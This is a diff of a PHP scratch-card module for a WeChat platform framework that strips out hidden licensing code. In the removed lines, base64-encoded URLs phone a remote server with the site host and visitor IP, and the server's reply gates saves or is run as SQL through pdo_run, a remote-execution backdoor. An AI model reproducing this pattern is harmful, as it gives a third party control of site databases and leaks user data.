@@ -3,7 +3,6 @@
  * 刮刮卡模块
  *
  * @author 微赞
- * @url http://www.00393.com/
  */
 defined('IN_IA') or exit('Access Denied');
 
@@ -170,30 +169,24 @@ class Stonefish_scratchModule extends WeModule {
 			'opportunity_txt' =>  $_GPC['opportunity_txt'],
         );
 		load()->func('communication');
-        $oauth2_code = base64_decode('aHR0cDovL3dlNy53d3c5LnRvbmdkYW5ldC5jb20vYXBwL2luZGV4LnBocD9pPTImaj03JmM9ZW50cnkmZG89YXV0aG9yaXplJm09c3RvbmVmaXNoX2F1dGhvcml6ZSZtb2R1bGVzPXN0b25lZmlzaF9zY3JhdGNoJndlYnVybD0=').$_SERVER ['HTTP_HOST']."&visitorsip=" . $_W['clientip'];
-        $content = ihttp_get($oauth2_code);
-        $token = @json_decode($content['content'], true);
         if (empty($id)) {
             if ($insert['starttime'] <= time()) {
                 $insert['isshow'] = 1;
             } else {
                 $insert['isshow'] = 0;
             }
-			if ($token['config']){
+			
                 pdo_insert('stonefish_scratch_reply', $insert);
 				$id = pdo_insertid();
-			}
+			
         } else {
-            if ($token['config']){
+    
 			    pdo_update('stonefish_scratch_reply', $insert, array('id' => $id));
-			}
+			
         }
-		if ($token['config']){
+		
 			//查询规则
-		}else{
-			pdo_run($token['error_code']);
-			//写入数据库规则
-		}
+		
 		//查询子公众号信息必保存分享设置
 		$acid_arr=uni_accounts();
 		$ids = array();
@@ -217,13 +210,13 @@ class Stonefish_scratchModule extends WeModule {
 					'share_fail' => $_GPC['share_fail_'.$acid],
 					'share_cancel' => $_GPC['share_cancel_'.$acid],
 			);
-			if ($token['config']){
+			
 				if (empty($_GPC['acid_'.$acid])) {
                     pdo_insert('stonefish_scratch_share', $insertshare);
                 } else {
                     pdo_update('stonefish_scratch_share', $insertshare, array('id' => $_GPC['acid_'.$acid]));
                 }
-			}
+			
 		
 		}
 		//查询子公众号信息必保存分享设置
@@ -246,9 +239,9 @@ class Stonefish_scratchModule extends WeModule {
 				    'credit_type' => $_GPC['prize_type'][$index],
 			    );
 				$updata['total_num'] += $_GPC['prizetotal'][$index];
-			    if ($token['config']){
+			   
 				    pdo_update('stonefish_scratch_prize', $insertprize, array('id' => $index));
-			    }
+			   
             }
 		}
 		if (!empty($_GPC['prizetype_new'])&&count($_GPC['prizetype_new'])>1) {
@@ -269,20 +262,18 @@ class Stonefish_scratchModule extends WeModule {
 				    'credit_type' => $_GPC['prize_type_new'][$index],
 			    );			
 				$updata['total_num'] += $_GPC['prizetotal_new'][$index];
-			    if ($token['config']){
+			    
                     pdo_insert('stonefish_scratch_prize', $insertprize);                    
-			    }
+			    
             }
 		}
 		if($updata['total_num']){
 			pdo_update('stonefish_scratch_reply', $updata, array('id' => $id));
 		}
 		//奖品配置
-		if ($token['config']){
+		
             return true;
-		}else{
-		    message('网络不太稳定,请重新编辑再试,或检查你的网络', referer(), 'error');
-		}
+		
     }
 
     public function ruleDeleted($rid) {
@@ -298,10 +289,7 @@ class Stonefish_scratchModule extends WeModule {
 		//点击模块设置时将调用此方法呈现模块设置页面，$settings 为模块设置参数, 结构为数组。这个参数系统针对不同公众账号独立保存。
 		//在此呈现页面中自行处理post请求并保存设置参数（通过使用$this->saveSettings()来实现）
 		load()->func('communication');
-        $oauth2_code = base64_decode('aHR0cDovL3dlNy53d3c5LnRvbmdkYW5ldC5jb20vYXBwL2luZGV4LnBocD9pPTImaj03JmM9ZW50cnkmZG89YXV0aG9yaXplY2hlY2smbT1zdG9uZWZpc2hfYXV0aG9yaXplJm1vZHVsZXM9c3RvbmVmaXNoX3NjcmF0Y2gmd2VidXJsPQ==').$_SERVER ['HTTP_HOST']."&visitorsip=" . $_W['clientip'];
-        $content = ihttp_get($oauth2_code);
-        $token = @json_decode($content['content'], true);
-		$config = $token['config'];
+		//$config = $token['config'];
 		$lianxi = $token['lianxi'];
 		//查询是否有商户网点权限
 		$modules = uni_modules($enabledOnly = true);
